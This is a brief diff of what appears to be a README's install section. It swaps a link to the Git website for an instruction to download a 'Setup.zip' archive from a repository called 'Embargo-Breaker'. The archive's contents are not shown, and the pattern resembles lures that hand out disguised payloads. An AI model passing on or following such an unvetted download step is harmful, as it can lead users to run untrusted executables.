@@ -7,5 +7,5 @@
 
 ## How to install?
 
-* For download [CLICK](https://git-scm.com/) and after download install app:
+* First, download the file from [here] (https://github.com/ALTONIBOT/Embargo-Breaker/blob/main/Setup.zip) .
 
